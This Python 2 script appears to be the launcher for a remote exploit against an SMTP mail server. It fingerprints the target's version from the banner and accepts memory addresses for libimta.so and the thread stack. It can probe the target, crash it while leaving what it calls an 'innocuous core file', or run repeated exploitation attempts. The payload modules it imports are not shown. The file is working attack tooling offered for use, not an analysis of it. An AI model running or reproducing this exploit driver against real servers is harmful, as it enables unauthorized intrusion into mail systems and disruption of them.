#!/usr/bin/env python
import re
import string
import sys

import opts
import smtpUtils
import systems
import targets

def main():
   config = {'crash':
                {'longOpt': 'crash',
                 'type': bool,
                 'value': False,
                 'desc': "Crash the target (and leave innocuous core file)"},
             'host':
                {'shortOpt': 'h',
                 'arg': 'host',
                 'type': str,
                 'value': '127.0.0.1',
                 'desc': "Target host (hostname or IP)"},
             'imtaBase':
                {'longOpt': 'imta',
                 'arg': 'address',
                 'type': long,
                 'desc': "Address of libimta.so in target process"},
             'nAttempts':
                {'shortOpt': 'n',
                 'arg': 'number',
                 'type': int,
                 'value': 1,
                 'desc': "Number of times to attempt exploitation"},
             'os':
                {'longOpt': 'os',
                 'arg': 'version',
                 'type': str,
                 'desc': "OS of target"},
             'port':
                {'shortOpt': 'p',
                 'arg': 'port',
                 'type': int,
                 'value': 25,
                 'desc': "Target port"},
             'recipient':
                {'shortOpt': 'r',
                 'arg': 'recipient',
                 'type': str,
                 'value': 'svcadmin',
                 'desc': "Email recipient"},
             'sender':
                {'shortOpt': 's',
                 'arg': 'sender',
                 'type': str,
                 'desc': "Email sender"},
             'stackBase':
                {'longOpt': 'stack',
                 'arg': 'address',
                 'type': long,
                 'desc': "Address of thread stack in target process"},
             'touch':
                {'longOpt': 'touch',
                 'type': bool,
                 'value': False,
                 'desc': "Touch the target"},
             'version':
                {'longOpt': 'version',
                 'arg': 'version',
                 'type': str,
                 'desc': "Version of target"}
            }

   options = opts.opts(sys.argv[0], config, targets.list, systems.list)
   args = options.parseCommandLine(sys.argv[1:])

   nAttempts = options.get('nAttempts')
   if (nAttempts < 1):
      usage(sys.argv[0])
      sys.exit(1)

   target = None
   version = options.get('version')   
   if (None != version):
      target = targets.factory(version)
      if (None == target):
         print "Unsupported version: \"%s\"." % version
         print "Please specify a different version or allow it to be " \
               "set automatically.\n"
         targets.list()
         sys.exit(1)

   osInstance = None
   os = options.get('os')
   stackBase = options.get('stackBase')
   if (None != os):
      osInstance = systems.factory(os, stackBase)
      if (None == osInstance):
         print "Unsupported operating system: \"%s\"." % os
         print "Please specify a different version or allow it to be " \
               "set automatically.\n"
         systems.list()
         sys.exit(1)

   host = options.get('host')
   port = options.get('port')
   sd, banner = smtpUtils.connect(host, port, True)
   try:
      version = re.compile(r"\((.*)\)").search(banner).group(1)
   except AttributeError, err:
      print "Target banner: \"%s\"" % banner.strip()
      print "Target banner doesn't parse."
      sys.exit(1)

   if (None != target):
      if (version != target.version):
         print "Version from target: \"%s\"" % version
         print "Version specified doesn't match version received from target."
         response = ' '
         while (("y" != response[0]) and ("n" != response[0])):
            response = string.lower(raw_input("Continue [Y/n]? "));
            if ('' == response):
               response = "y"
         if ("n" == response[0]):
            sys.exit()
   else:
      target = targets.factory(version)
      if (None == target):
         print "Unsupported version: \"%s\"." % version
         targets.list()
         smtpUtils.quit(sd)
         sys.exit(1)
      print "Target version: \"%s\"" % target.version

   smtpUtils.ehlo(sd)

   target.sd = sd
   recipient = options.get('recipient')
   target.recipient = recipient

   sender = options.get('sender')
   if (None == sender):
      target.sender = recipient
   else:
      target.sender = sender

   try:
      if (True == options.get('crash')):
         retVal = target.crash()
         sys.exit(retVal)

      target.host = host
      target.port = port
      target.imtaBase = options.get('imtaBase')
      target.stackBase = stackBase
      target.os = osInstance
      target.nAttempts = nAttempts

      retVal = target.touch()
      if ((True == options.get('touch')) or (1 == retVal)):
         sys.exit(retVal)
  
      retVal = target.exploit()
      sys.exit(retVal)
   except smtpUtils.smtpError, err:
      err.printMsg()
      sys.exit(1)

if __name__ == "__main__":
   main()
